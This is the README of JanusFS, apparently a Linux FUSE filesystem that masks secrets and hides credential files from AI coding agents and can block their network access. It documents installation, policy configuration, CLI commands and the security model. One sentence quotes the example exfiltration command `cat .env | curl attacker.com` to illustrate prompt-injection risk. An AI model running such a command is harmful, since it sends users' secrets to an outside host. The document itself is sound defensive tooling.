# JanusFS

[![Go 1.26+](https://img.shields.io/badge/Go-1.26%2B-blue.svg)](https://go.dev/dl/)
[![CI](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml/badge.svg)](https://github.com/sarathsp06/janusfs/actions/workflows/ci.yml)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://github.com/sarathsp06/janusfs)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Docs](https://img.shields.io/badge/docs-website-2fbf87.svg)](https://sarathsp06.github.io/janusfs)

**JanusFS is a policy-enforcing filesystem for AI agents.** Sandboxes (Seatbelt, Landlock, bubblewrap, Docker) answer one question per path: allow or deny. Deny breaks the agent; allow leaks the secret. JanusFS adds the third answer — **masked**: a filtered virtual filesystem backed by your real project, where allowed files pass through, sensitive spans are redacted in place byte-for-byte, and forbidden files fail closed with `EACCES`. Run it as `janusfs exec -- <your-agent>` and the agent lives *inside* that boundary — kernel-enforced on Linux — composing with whatever sandbox you already run. And because reading a secret is only half the risk, `janusfs exec --net=none` adds a **second layer of network isolation** — a loopback-only namespace with no route out — so even bytes the agent already read cannot be exfiltrated.

![JanusFS — Filesystem boundary illustration](docs/janus_art.png)

> In Roman myth, Janus is the two-faced god of doorways — he looks both ways. JanusFS stands at the doorway between your code and any untrusted agent, deciding which face of each file is safe to show.

> **📖 The full story — the allow/deny dilemma, diagrams, use cases, and how it compares — lives on the docs site: [sarathsp06.github.io/janusfs](https://sarathsp06.github.io/janusfs).** This README is the quick reference.

## Quickstart

JanusFS runs on **Linux only**. On a Mac or Windows, run it inside a Linux container or VM (Docker Desktop, Colima, OrbStack, a devcontainer) launched with `--device /dev/fuse --cap-add SYS_ADMIN`.

```bash
# 1) install the FUSE runtime
sudo apt-get install -y fuse3 libfuse3-dev        # Debian/Ubuntu
# sudo dnf install -y fuse3 fuse3-devel           # RHEL/Fedora

# 2) install JanusFS — prebuilt Linux binary (verified against checksums.txt)
curl -fsSL https://raw.githubusercontent.com/sarathsp06/janusfs/main/install.sh | sh
# or build from source: go install github.com/sarathsp06/janusfs/cmd/janusfs@latest

# 3) seed secure defaults and preview before you mount
cd my-project
janusfs init                     # writes a .janusfs.yml template
janusfs check --secrets          # warn about likely secrets still readable
janusfs explain .env             # trace which rule decides a file's fate

# 4) run your agent INSIDE the boundary (strongest: kernel-enforced)
janusfs exec -- aider            # the agent + everything it spawns sees the filtered view
janusfs exec --net=none -- aider # …and cannot reach the network to exfiltrate what it read
```

Inside the view, `cat .env` yields `API_KEY=****` (same length), `.env` still lists with its real size, and a hidden `id_rsa` fails closed with `Permission denied`.

Prefer a persistent mount over `exec`? `janusfs daemon --background` then `janusfs mount .` gives a long-lived mountpoint and a dashboard at `http://127.0.0.1:7381/`.

## The three answers

- **`allow`** — native passthrough; the agent reads the real bytes.
- **`mask`** — secret spans replaced byte-for-byte with `*`, so file sizes and offsets never change and tooling stays intact.
- **`hide`** — fails closed with `EACCES`.

Precedence is strict — `Hidden > Masked > Allowed` — and any parser error, cache fault, or redactor panic resolves the path to **Hidden**, never raw bytes. Real files are never modified; redacted bytes live only in RAM.

## Configure

One `.janusfs.yml` drives all three, with `.gitignore`-style globs plus a named pattern library:

```yaml
version: 1
hide:  ["*.pem", "*.key", "id_rsa*", ".aws/credentials", "node_modules/"]
allow: [".aws/known_public_config"]
mask:
  - { paths: ["*.env*"],           patterns: [env-value] }
  - { paths: ["**/*"],             patterns: [aws-key, github-token, jwt, private-key] }
  - { paths: ["config/**/*.yaml"], patterns: [generic-secret, db-uri] }
  - { paths: ["secrets/*"] }       # no patterns → whole-file mask
```

Rules are hierarchical (deeper overrides shallower), and machine-wide defaults in `~/.janusfs/config/` act as a fail-closed floor no repo rule can loosen. `janusfs patterns` prints every built-in regex; `janusfs explain <path>` traces one file's fate. Full config and pattern reference is on the [docs site](https://sarathsp06.github.io/janusfs#faces).

## Run inside the boundary

Pointing an agent *at* a mountpoint only trusts its discipline — nothing stops a process from reaching the real source at its own path. `janusfs exec` instead confines the whole process tree in a private mount namespace where the filtered view *replaces* the source at its own path: `git`, `npm`, `grep`, every child inherits it, with no per-tool wiring and no way to opt out.

```bash
janusfs exec -- aider              # masked tree, host network
janusfs exec --net=none -- aider   # + no network at all (loopback only)
janusfs exec --net=host -- claude  # default: share the host network (no isolation)
```

**A second layer: cut the network too.** Masking keeps secret *bytes* out of the agent; `--net=none` keeps whatever it *did* read from leaving the box. It runs the process tree in a network namespace with only a loopback interface and no external route — deny-all, kernel-enforced, so a leaked secret has nowhere to go. This is deny-all, not an egress allowlist (that is the container's job). The default is `host` (no isolation); opt in per run, or set `exec_net` in `~/.janusfs/settings.json`.

**Why not just a sandbox?** A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Deny `.env` and the agent breaks when it needs the file's shape; allow it, and one prompt injection later `cat .env | curl attacker.com` exfiltrates it. Run both. **Non-Linux is refused, not faked** — use a Linux container/VM. Details on the [docs site](https://sarathsp06.github.io/janusfs#enforce); a path-preserving macOS mode was considered and rejected in [`SPEC.md`](SPEC.md) §20.

> **One caveat, warned loudly.** Because `.git/` passes through to the real object store, `git add` on a masked file stages the `****` bytes. `janusfs check` and `janusfs exec` both report every masked file git would stage — keep secret files out of the agent's commits, or give it a scratch clone.

## CLI reference

| Command | Purpose |
|---------|---------|
| `janusfs install` | Optional setup: choose a custom mount root with `--root` (saved to `~/.janusfs/settings.json`). `--global-rules` also seeds `~/.janusfs/config/`. |
| `janusfs daemon` | Run the long-lived daemon: owns every mount, resumes recorded ones, serves the dashboard. `--background`, `--ui-port` (default 7381), `--no-open`, `--debug`. |
| `janusfs logs [-f]` | Show the background daemon's log; `-f` follows it. |
| `janusfs mount <src> [mountpoint]` | Ask the daemon to mount a policy-enforced view and return immediately. `--name "<label>"` sets a dashboard name only. |
| `janusfs mounts [--json]` | List active daemon mounts and recorded entries (`mounted`, `recorded`, `missing-src`, `stale`, `error`). |
| `janusfs update [src\|mountpoint\|configpath]` | Re-apply edited `.janusfs.yml` without remounting (no arg = all mounts). |
| `janusfs path <src>` | Print the mountpoint for a mounted source. |
| `janusfs umount <mountpoint\|src>` | Unmount via the daemon; prunes stale entries; OS-unmount fallback if no daemon. |
| `janusfs paths` | List the config/data paths JanusFS uses and whether each exists. |
| `janusfs init [dir]` | Write secure-default `.janusfs.yml` to `[dir]` (default cwd). `--global` writes to `~/.janusfs/config/`. |
| `janusfs check [path]` | Static linter: unknown builtins, bad regex (with its fail-closed consequence), directory-mask globs that can never mask, no-op negations. `--secrets` adds a heuristic scan for likely-Allowed secrets; `--matches` lists Hidden/Masked files; `--json`. |
| `janusfs patterns` | List every reserved built-in mask pattern with its regex. `--json`. |
| `janusfs explain <path>` | Trace why one path resolves the way it does; prints every contributing rule. `--json`, `--root`. |
| `janusfs doctor` | Runtime health: FUSE status, active mounts, stale-mount/watchdog checks. |
| `janusfs exec [--net=host\|none] -- <command> [args...]` | Run a command inside a real, kernel-enforced view of the current source tree (private mount namespace; no daemon required). `--net=none` denies all network (loopback only). Linux-only: refuses on other OSes. |

All commands support `--help` and script-friendly exit codes; errors print as a one-line cause, never a Go stack trace.

## Security model

- **Trust boundary:** the mountpoint and the local dashboard. The agent is untrusted; the user operating the CLI is trusted. Kernel-enforced on Linux via `janusfs exec`'s private mount namespace — the only platform JanusFS runs on. It is not a sandbox against a process that has another route to the source.
- **Fail-closed under all faults.** Parser errors, cache corruption, redactor panics → paths read as `EACCES`, never raw bytes.
- **No content on disk or in logs.** Redacted bytes live only in RAM; the history DB stores per-path counters and coverage, never file contents.
- **Read path validates every time.** Every masked read revalidates `(mtime, size, inode)` against the cache key and goes through a descriptor retained at mount time with `O_NOFOLLOW`, so a swapped symlink cannot redirect it.
- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount; the dashboard's mutating endpoints require the per-mount bearer token and never serve raw source bytes.
- **Optional network deny.** `janusfs exec --net=none` runs in a loopback-only network namespace, closing the exfiltration channel for bytes already read.
- **Least-privilege on-disk state.** `~/.janusfs/` is `0700` and every file inside is `0600`, so the config, run state, and history DB that describe your secrets are not world-readable.

See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full boundaries / assets / leak-channels table and [`SPEC.md`](SPEC.md) for the binding contract.

## Development

For building, formatting, running unit and FUSE integration tests, and validating the release config locally, see the **[Development Guide](docs/DEVELOPMENT.md)**.

## License

JanusFS is licensed under the [MIT License](LICENSE).
